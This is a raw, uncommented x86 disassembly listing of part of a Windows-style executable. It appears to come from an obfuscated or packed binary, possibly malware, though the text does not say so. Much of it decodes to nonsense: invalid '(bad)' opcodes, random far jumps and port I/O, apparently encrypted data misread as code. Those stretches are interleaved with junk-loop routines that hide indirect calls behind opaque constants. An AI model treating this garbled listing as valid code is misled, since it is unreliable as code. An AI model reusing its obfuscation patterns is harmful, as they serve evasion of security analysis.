  407c8c:	sub    DWORD PTR [ecx+0x4c],esi
  407c8f:	pop    esi
  407c90:	cmp    ebp,DWORD PTR [esi]
  407c92:	aam    0x68
  407c94:	jae    0x407c3e
  407c96:	in     al,dx
  407c97:	dec    eax
  407c98:	in     al,dx
  407c99:	ret    
  407c9a:	test   bh,dh
  407c9c:	out    dx,al
  407c9d:	ins    BYTE PTR es:[edi],dx
  407c9e:	mov    esp,DWORD PTR ds:0xb640ba73
  407ca4:	mov    ds:0x672a3274,eax
  407ca9:	push   ecx
  407caa:	mov    esp,fs
  407cac:	outs   dx,BYTE PTR ds:[esi]
  407cad:	test   DWORD PTR [ebx-0x6f],edx
  407cb0:	pop    eax
  407cb1:	mov    ebx,0x5d789851
  407cb6:	jmp    0xf0b5d19f
  407cbb:	addr16 jns 0x407d31
  407cbe:	(bad)  
  407cbf:	daa    
  407cc0:	sbb    ch,0x9
  407cc3:	jg     0x407d23
  407cc5:	or     eax,DWORD PTR [ecx+0x56fa2dd7]
  407ccb:	sti    
  407ccc:	cmp    al,0x49
  407cce:	mov    dl,0xb8
  407cd0:	lahf   
  407cd1:	jae    0x407d4b
  407cd3:	or     al,0x86
  407cd5:	sahf   
  407cd6:	call   0x87b90b8c
  407cdb:	pop    edx
  407cdc:	or     al,0x5d
  407cde:	mov    al,ds:0x617299b7
  407ce3:	inc    edx
  407ce4:	cmp    al,0x6f
  407ce6:	or     esi,eax
  407ce8:	clc    
  407ce9:	out    0x46,al
  407ceb:	cmp    esp,DWORD PTR [ebx]
  407ced:	push   esp
  407cee:	loopne 0x407d4e
  407cf0:	(bad)  
  407cf1:	pop    esp
  407cf2:	pop    ecx
  407cf3:	pusha  
  407cf4:	fild   DWORD PTR [esi-0x3b]
  407cf7:	push   es
  407cf8:	call   0xdde8:0xd7c76652
  407cff:	sbb    DWORD PTR [esi-0x9],esi
  407d02:	adc    bh,al
  407d04:	daa    
  407d05:	enter  0xc1fd,0x69
  407d09:	add    al,0x89
  407d0b:	pop    ss
  407d0c:	and    eax,0xe4cd973d
  407d11:	dec    ebx
  407d12:	jnp    0x407d51
  407d14:	fs fbstp TBYTE PTR fs:[eax+0x268ddc3d]
  407d1c:	test   DWORD PTR [ebp+0x7dc535d8],ecx
  407d22:	dec    eax
  407d23:	inc    edx
  407d24:	inc    ebp
  407d25:	int    0x39
  407d27:	cmp    DWORD PTR [edx+0x77caef3b],edx
  407d2d:	pop    es
  407d2e:	call   0x8e21:0x7c9e0fed
  407d35:	repnz sbb cl,BYTE PTR [edi+0x38aed5b6]
  407d3c:	mov    al,ah
  407d3e:	or     BYTE PTR [eax+esi*8-0x63],0x45
  407d43:	mov    dl,0x9d
  407d45:	ja     0x407d42
  407d47:	mov    BYTE PTR [eax+0x79],bl
  407d4a:	dec    ebp
  407d4b:	push   ecx
  407d4c:	rol    bh,0x50
  407d4f:	and    esp,esp
  407d51:	test   BYTE PTR [esi+0x5c],dl
  407d54:	or     al,0xb7
  407d56:	adc    eax,0xd93d1c96
  407d5b:	ins    BYTE PTR es:[edi],dx
  407d5c:	in     al,dx
  407d5d:	das    
  407d5e:	jmp    0x8b7f:0xa71742bc
  407d65:	inc    eax
  407d66:	daa    
  407d67:	popa   
  407d68:	xor    DWORD PTR [edx],ecx
  407d6a:	loope  0x407cfa
  407d6c:	pop    esi
  407d6d:	loop   0x407d5c
  407d6f:	or     ah,ah
  407d71:	and    al,0x43
  407d73:	pusha  
  407d74:	xchg   esp,eax
  407d75:	mov    dl,0x5
  407d77:	push   0x2bfa9443
  407d7c:	stos   DWORD PTR es:[edi],eax
  407d7d:	lea    eax,[ebp+ecx*4+0x1e]
  407d81:	jmp    0x2ec5:0x597fc7c6
  407d88:	adc    eax,edx
  407d8a:	outs   dx,DWORD PTR ds:[esi]
  407d8b:	jmp    0x4ce3576e
  407d90:	fld    QWORD PTR [edi+0x7b]
  407d93:	outs   dx,DWORD PTR ds:[esi]
  407d94:	test   ebp,esi
  407d96:	cmp    eax,0xd2199901
  407d9b:	push   esp
  407d9c:	cmp    eax,0x78353b23
  407da1:	fcmovne st,st(2)
  407da3:	xor    dh,BYTE PTR [esi-0x66]
  407da6:	aaa    
  407da7:	addr16 jbe 0x407d9d
  407daa:	stos   DWORD PTR es:[edi],eax
  407dab:	xor    DWORD PTR [eax+0x5f],ebp
  407dae:	xchg   ebp,eax
  407daf:	xor    al,0x66
  407db1:	jno    0x407d3f
  407db3:	dec    edx
  407db4:	sete   BYTE PTR [edi-0x3c8823ed]
  407dbb:	sub    DWORD PTR [esi+ecx*8-0x49271f10],0xffffffed
  407dc3:	retf   
  407dc4:	xlat   BYTE PTR ds:[ebx]
  407dc5:	mov    edi,esp
  407dc7:	jo     0x407d50
  407dc9:	mov    al,ds:0xbedea5
  407dce:	xor    BYTE PTR [ecx-0x69],cl
  407dd1:	mov    ch,0xa2
  407dd3:	stos   BYTE PTR es:[edi],al
  407dd4:	addr16 hlt 
  407dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dd7:	xchg   cl,ch
  407dd9:	xor    al,0x51
  407ddb:	es jo  0x407d8d
  407dde:	dec    ebp
  407ddf:	test   DWORD PTR [edi-0x68],ecx
  407de2:	aas    
  407de3:	jno    0x407e0d
  407de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407de6:	jp     0x407e4d
  407de8:	xor    eax,0xab22abc
  407ded:	jb     0x407d7f
  407def:	xchg   ebp,eax
  407df0:	add    eax,DWORD PTR [bx+si+0x74]
  407df4:	xor    al,0xab
  407df6:	shl    DWORD PTR [ebp+0x68],cl
  407df9:	(bad)  
  407dfa:	dec    esp
  407dfb:	add    ch,BYTE PTR [edi+0x611190cd]
  407e01:	mov    ecx,0x42e16275
  407e06:	add    eax,0x552da795
  407e0b:	add    edi,edi
  407e0d:	push   0x3b
  407e0f:	and    eax,0xd5da4d53
  407e14:	cmp    BYTE PTR [esi],dh
  407e16:	lods   eax,DWORD PTR ds:[esi]
  407e17:	pop    es
  407e18:	enter  0x4f70,0xf3
  407e1c:	cdq    
  407e1d:	and    al,0x4f
  407e1f:	lock stos DWORD PTR es:[edi],eax
  407e21:	hlt    
  407e22:	adc    bl,dl
  407e24:	xlat   BYTE PTR ds:[ebx]
  407e25:	lds    ecx,FWORD PTR [ebx-0x547b45c7]
  407e2b:	sbb    bh,BYTE PTR [edi+0x40]
  407e2e:	into   
  407e2f:	sbb    eax,0xe9cb0f51
  407e34:	mov    ds:0x150df1c2,eax
  407e39:	popf   
  407e3a:	pop    esi
  407e3b:	cmc    
  407e3c:	push   eax
  407e3d:	xlat   BYTE PTR ds:[ebx]
  407e3e:	rcr    al,0xe4
  407e41:	into   
  407e42:	pop    ss
  407e43:	test   bh,al
  407e45:	mov    eax,0xb2a62bdb
  407e4a:	ret    0xd4b5
  407e4d:	pop    ebp
  407e4e:	(bad)  
  407e4f:	sub    BYTE PTR [eax-0x5391f10b],dh
  407e55:	daa    
  407e56:	sbb    DWORD PTR [ebx+0x5af61d83],edi
  407e5c:	cmp    DWORD PTR [edi+edi*2-0xe],ebx
  407e60:	cdq    
  407e61:	mov    DWORD PTR [eax],edx
  407e63:	mov    eax,DWORD PTR [ebp-0xc]
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x4337eb
  407f81:	or     DWORD PTR ds:0x4337ef,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x433857,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x433853,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43389b
  407fad:	sub    DWORD PTR ds:0x433827,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x4337db
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x43382b,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x43382b
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x43382b,ebx
  407fdd:	cmp    DWORD PTR ds:0x43382b,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x43382b,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x433a67
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x43382b,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x43382b
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x43382b,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x43382b,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x43382b
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x43382b,ebx
  408048:	cmp    DWORD PTR ds:0x43382b,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x43382b,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x43382b,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x43382b
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x43382b,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x43377b,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x43385b
  4080b1:	and    DWORD PTR ds:0x433863,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43381b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x4338a3,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x4338a3
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x4338a3,ebx
  4080e3:	cmp    DWORD PTR ds:0x4338a3,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x43385b
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x4338a3,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x4338a3
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x4338a3,ebx
  40811d:	cmp    DWORD PTR ds:0x4338a3,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433897,0x1f
  40813b:	cmp    DWORD PTR ds:0x433897,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433897,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433897
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433897,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x9e8b250d
  408191:	mov    BYTE PTR [esi],bh
  408193:	retf   0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40819b:	fild   QWORD PTR cs:[eax-0x13ad013f]
  4081a2:	xchg   ecx,eax
  4081a3:	push   ss
  4081a4:	dec    ecx
  4081a5:	outs   dx,BYTE PTR ds:[esi]
  4081a6:	test   DWORD PTR [ebp+0x21],esi
  4081a9:	pop    eax
  4081aa:	mov    bh,0x8a
  4081ac:	mov    dh,0x48
  4081ae:	and    BYTE PTR [ebp+0x6925d87],0xac
  4081b5:	mov    ecx,0xe75f7707
  4081ba:	loopne 0x408174
  4081bc:	rcl    BYTE PTR [edx+0x61],1
  4081bf:	jns    0x408192
  4081c1:	xchg   edx,eax
  4081c2:	out    dx,al
  4081c3:	pop    ebp
  4081c4:	imul   esi,DWORD PTR [ebx+0x5aa89679],0x55
  4081cb:	pop    ds
  4081cc:	push   ss
  4081cd:	xlat   BYTE PTR ds:[ebx]
  4081ce:	push   ds
  4081cf:	sar    DWORD PTR [eax-0x5a],1
  4081d2:	or     ebp,DWORD PTR [edx-0x4973f10d]
  4081d8:	inc    esp
  4081d9:	rcr    BYTE PTR [edx+0x0],0x32
  4081dd:	shl    ch,1
  4081df:	stos   BYTE PTR es:[edi],al
  4081e0:	jg     0x40825b
  4081e2:	int    0xf3
  4081e4:	or     esp,DWORD PTR [eax+eax*8+0xc]
  4081e8:	mov    ebp,0x655665d8
  4081ed:	scas   eax,DWORD PTR es:[edi]
  4081ee:	fldenv [edi+0x51f6259b]
  4081f4:	adc    eax,0x6c8e4afc
  4081f9:	mov    bh,0xb8
  4081fb:	add    DWORD PTR [edx-0x649b068],edi
  408201:	add    al,0xcf
  408203:	push   es
  408204:	in     al,dx
  408205:	sub    al,0x54
  408207:	dec    ebx
  408208:	xor    BYTE PTR [ecx-0x27],bl
  40820b:	xor    eax,ebp
  40820d:	loopne 0x408194
  40820f:	enter  0x971,0x7c
  408213:	and    edi,DWORD PTR [esp+edx*2-0x3d]
  408217:	cwde   
  408218:	xchg   esp,eax
  408219:	dec    esi
  40821a:	imul   edi,DWORD PTR [ecx-0x1d627ebf],0xbd69227e
  408224:	clc    
  408225:	ret    
  408226:	dec    ebx
  408227:	cli    
  408228:	xchg   dl,cl
  40822a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40822b:	mov    eax,0x9d5dc4d9
  408230:	sub    BYTE PTR [eax+0x7b],al
  408233:	sub    DWORD PTR ds:0x306cd8f4,esp
  408239:	(bad)  
  40823a:	out    dx,al
  40823b:	dec    edi
  40823c:	pop    ebp
  40823d:	mov    bh,0x47
  40823f:	xor    ebp,eax
  408241:	call   0x84dfaafc
  408246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408247:	fldlg2 
  408249:	xchg   edx,eax
  40824a:	dec    esp
  40824b:	rcl    DWORD PTR ds:0x5445a3b,cl
  408251:	jne    0x408296
  408253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408254:	xlat   BYTE PTR ds:[ebx]
  408255:	imul   esp,DWORD PTR [ecx-0x70648832],0x30301b7b
  40825f:	jle    0x408268
  408261:	pop    ebx
  408262:	pop    ds
  408263:	and    al,0xd1
  408265:	aas    
  408266:	mov    ah,0x86
  408268:	retf   
  408269:	arpl   WORD PTR [esi],dx
  40826b:	inc    ecx
  40826c:	iret   
  40826d:	mov    ds:0xe05826b3,eax
  408272:	das    
  408273:	jl     0x4082cc
  408275:	sar    BYTE PTR [ecx+0x2f],0xb9
  408279:	stos   DWORD PTR es:[edi],eax
  40827a:	push   cs
  40827b:	sbb    dl,0xf
  40827e:	enter  0xff15,0x5a
  408282:	jno    0x408299
  408284:	daa    
  408285:	cmp    eax,0x9f4d4e6c
  40828a:	je     0x40827d
  40828c:	xor    edx,edi
  40828e:	ror    edi,1
  408290:	jnp    0x4082cf
  408292:	or     bh,BYTE PTR [ebx-0x1a79932]
  408298:	fld    DWORD PTR [ecx]
  40829a:	and    al,0xe3
  40829c:	jb     0x40830c
  40829e:	jne    0x408249
  4082a0:	out    0x9f,al
  4082a2:	xor    DWORD PTR [edi],ebx
  4082a4:	mov    ch,0x2a
  4082a6:	xchg   esi,eax
  4082a7:	daa    
  4082a8:	cmp    DWORD PTR [eax+0x3c],edx
  4082ab:	xchg   esi,eax
  4082ac:	sub    al,0xfe
  4082ae:	inc    esi
  4082af:	push   0x47c8fcc3
  4082b4:	lock pushf 
  4082b6:	mov    ch,0x23
  4082b8:	sbb    al,0xed
  4082ba:	jbe    0x408317
  4082bc:	dec    ebx
  4082bd:	call   0x6c8e90d0
  4082c2:	or     eax,0xfe1fd6ea
  4082c7:	test   BYTE PTR [edi+0x65],al
  4082ca:	and    DWORD PTR [eax-0x53],eax
  4082cd:	maxps  xmm6,XMMWORD PTR [eax-0x6e]
  4082d1:	int    0x45
  4082d3:	cmp    DWORD PTR [esp+edi*2+0x7f],0x23
  4082d8:	adc    BYTE PTR [ebx+0x7d],dh
  4082db:	imul   esp,DWORD PTR [eax+0x18],0xe9039042
  4082e2:	lods   eax,DWORD PTR ds:[esi]
  4082e3:	mov    dh,0x15
  4082e5:	inc    esi
  4082e6:	sbb    BYTE PTR [eax+0x35],0x33
  4082ea:	dec    edx
  4082eb:	xor    eax,0xefb1d504
  4082f0:	xlat   BYTE PTR ds:[ebx]
  4082f1:	scas   al,BYTE PTR es:[edi]
  4082f2:	mov    edx,0xf4c22d80
  4082f7:	mov    esp,0xc08f189d
  4082fc:	mul    BYTE PTR es:[ebp+eiz*8+0x34]
  408301:	sahf   
  408302:	mov    eax,ds:0x98ebad86
  408307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408308:	(bad)  
  408309:	xor    al,0x3b
  40830b:	and    edi,0xddfd4856
  408311:	jb     0x4082fe
  408313:	mov    al,0x3f
  408315:	fild   WORD PTR [esi]
  408317:	adc    ch,BYTE PTR [ebx+0xc]
  40831a:	or     bl,BYTE PTR [ebx-0x43]
  40831d:	nop
  40831e:	ins    DWORD PTR es:[edi],dx
  40831f:	inc    esi
  408320:	pushf  
  408321:	je     0x408343
  408323:	cdq    
  408324:	cmp    BYTE PTR [eax],dl
  408326:	mov    ch,0xe
  408328:	and    eax,0xe8398212
  40832d:	into   
  40832e:	hlt    
  40832f:	and    ebx,esp
  408331:	pusha  
  408332:	cmp    al,BYTE PTR [esi+0x61]
  408335:	inc    edi
  408336:	pop    ebp
  408337:	push   0x48
  408339:	in     al,0xc0
  40833b:	adc    al,0xc4
  40833d:	push   es
  40833e:	push   cs
  40833f:	inc    edx
  408340:	push   ds
  408341:	dec    edx
  408342:	or     BYTE PTR [ecx+0x66],bl
  408345:	inc    edx
  408346:	xchg   edi,eax
  408347:	(bad)  
  408348:	adc    eax,0x1e2b24d4
  40834d:	cli    
  40834e:	sub    BYTE PTR ds:0xbd6604ae,bl
  408354:	jcxz   0x4083c0
  408357:	or     DWORD PTR [esi-0x2d],ebx
  40835a:	test   eax,0x74496398
  40835f:	rcl    BYTE PTR [esi+0x7d2af2f],cl
  408365:	and    al,0x99
  408367:	ret    
  408368:	jnp    0x4083c7
  40836a:	js     0x4082fb
  40836c:	jle    0x408307
  40836e:	cmp    esi,DWORD PTR ds:[ebx]
  408371:	imul   ecx,DWORD PTR [ecx-0x1e]
  408375:	pop    ebx
  408376:	les    ecx,FWORD PTR [ebx-0x4c]
  408379:	hlt    
  40837a:	fimul  WORD PTR [edi]
  40837c:	mov    esi,0x1a3d5c78
  408381:	adc    al,0x4
  408383:	push   ds
  408384:	push   ebp
  408385:	jmp    0x4083ec
  408387:	push   ebx
  408388:	gs inc edi
  40838a:	adc    DWORD PTR [esi+0x33],eax
  40838d:	sbb    edi,DWORD PTR [esi+0x1d]
  408390:	xchg   ebp,eax
  408391:	push   cs
  408392:	pop    edx
  408393:	push   ebx
  408394:	inc    eax
  408395:	fcom   QWORD PTR [edi-0x40]
  408398:	cmp    edi,DWORD PTR [esi-0x22a01b83]
  40839e:	add    esp,DWORD PTR [ecx-0x7a196433]
  4083a4:	jae    0x4083d9
  4083a6:	mov    bh,0xef
  4083a8:	dec    esi
  4083a9:	mov    ch,bh
  4083ab:	jge    0x4083ee
  4083ad:	fistp  QWORD PTR [esi+eax*8]
  4083b0:	adc    dh,ch
  4083b2:	mov    ah,0xf4
  4083b4:	imul   ebp,DWORD PTR ds:0x240c739c,0xf7ba0505
  4083be:	pop    ebp
  4083bf:	fdiv   QWORD PTR ds:0x89ec097c
  4083c5:	inc    ebp
  4083c6:	loopne 0x408349
  4083c8:	and    eax,0x4337db
  4083cd:	add    BYTE PTR [eax],al
  4083cf:	add    BYTE PTR [eax],al
  4083d1:	mov    eax,ds:0x4337db
  4083d6:	inc    eax
  4083d7:	mov    ds:0x4337db,eax
  4083dc:	cmp    DWORD PTR ds:0x4337db,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x4337db,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x4337db
  40840c:	inc    eax
  40840d:	mov    ds:0x4337db,eax
  408412:	cmp    DWORD PTR ds:0x4337db,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43378b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433793,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x4338a7
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	imul   esp,DWORD PTR [eax-0x4],0x7ec8e43c
  40846b:	jle    0x408491
  40846d:	jl     0x4084ed
  40846f:	jle    0x4084d0
  408471:	jle    0x408427
  408473:	jmp    0x16ff:0xb6245992
  40847a:	ins    DWORD PTR es:[edi],dx
  40847b:	xchg   ebp,eax
  40847c:	imul   edi,DWORD PTR [esi-0x9569378],0x8
  408483:	(bad)  
  408484:	in     al,0x50
  408486:	push   0x7a
  408488:	ja     0x408487
  40848a:	repnz mov edi,0x7c333786
  408490:	idiv   DWORD PTR [ebp-0x4d5f0ac6]
  408496:	cdq    
  408497:	adc    BYTE PTR [esi+ebx*8-0x15faf93e],bh
  40849e:	sti    
  40849f:	pop    ds
  4084a0:	sbb    bh,dl
  4084a2:	dec    esi
  4084a3:	repnz mov ecx,0x45776e6
  4084a9:	push   edi
  4084aa:	xchg   ebp,eax
  4084ab:	rcl    BYTE PTR ds:0xc4ffa31a,0x2e
  4084b2:	aam    0x5
  4084b4:	sbb    edi,DWORD PTR [eax-0x345e4235]
  4084ba:	jg     0x408528
  4084bc:	or     eax,0x809380b
  4084c1:	sbb    al,0xb2
  4084c3:	aad    0x52
  4084c5:	loopne 0x408459
  4084c7:	push   ds
  4084c8:	out    0xf,eax
  4084ca:	sbb    DWORD PTR [edx+0x6],esi
  4084cd:	jno    0x4084a6
  4084cf:	cmp    dl,BYTE PTR [edx]
  4084d1:	mov    esp,0x2032543f
  4084d6:	mov    esi,0xccf4c6fc
  4084db:	xor    BYTE PTR [edi+0x71],dh
  4084de:	sbb    edx,esi
  4084e0:	stos   DWORD PTR es:[edi],eax
  4084e1:	jns    0x40853d
  4084e3:	dec    esi
  4084e4:	enter  0xa4f9,0xd1
  4084e8:	mov    WORD PTR [esi+eax*2],?
  4084eb:	jae    0x4084fc
  4084ed:	jecxz  0x408542
  4084ef:	neg    BYTE PTR [esi-0x54e65835]
  4084f5:	pop    ecx
  4084f6:	mov    ch,BYTE PTR [edi-0x208ea787]
  4084fc:	and    cl,BYTE PTR [eax]
  4084fe:	push   eax
  4084ff:	jg     0x4084b6
  408501:	in     al,dx
  408502:	inc    ebp
  408503:	shl    DWORD PTR [edi+0x6d],1
  408506:	pop    ebp
  408507:	and    BYTE PTR [eax],ah
  408509:	and    al,0x9e
  40850b:	and    BYTE PTR [ecx],0xda
  40850e:	rcl    dh,1
  408510:	adc    al,0xf8
  408512:	cmp    al,0x3f
  408514:	or     DWORD PTR [edx],eax
  408516:	xchg   esp,eax
  408517:	mov    eax,ds:0x59aaeab3
  40851c:	cmp    eax,0xc1516311
  408521:	enter  0xd87f,0x5
  408525:	sub    al,0x26
  408527:	aaa    
  408528:	xor    DWORD PTR [ebx-0xc],edx
  40852b:	stc    
  40852c:	ret    0x6b2e
  40852f:	jmp    0x6daa:0x14b11f41
  408536:	arpl   sp,di
  408538:	divps  xmm4,XMMWORD PTR [edi-0x1ad7a9bf]
  40853f:	mov    ecx,0x8dcfde45
  408544:	push   0x1b
  408546:	shl    DWORD PTR ds:0xa7423716,cl
  40854c:	mov    eax,0x59d9cd71
  408551:	and    BYTE PTR ds:0x46941c41,0x94
  408558:	call   0xe9edd5e5
  40855d:	retf   
  40855e:	jno    0x4085cf
  408560:	xchg   esp,eax
  408561:	(bad)  
  408562:	hlt    
  408563:	dec    eax
  408564:	daa    
  408565:	push   ebp
  408566:	inc    ebx
  408567:	sar    ebp,1
  408569:	fs test eax,0x3c42fd12
  40856f:	(bad)  
  408570:	lods   al,BYTE PTR ds:[esi]
  408571:	pop    ebp
  408572:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408574:	xchg   BYTE PTR [esi+0x15],bl
  408577:	push   edx
  408578:	fadd   QWORD PTR [ebp+0x7]
  40857b:	loopne 0x40851a
  40857d:	rol    bl,1
  40857f:	jmp    0x192b:0x6fb9c1b
  408586:	xchg   edi,eax
  408587:	mov    bh,0x29
  408589:	mov    ebp,0x15f74c71
  40858e:	adc    eax,0x5879ff87
  408593:	int3   
  408594:	out    0xe1,eax
  408596:	xchg   DWORD PTR [edi+0x22ee49e1],ebp
  40859c:	maxps  xmm3,XMMWORD PTR [ebx-0x6faa137b]
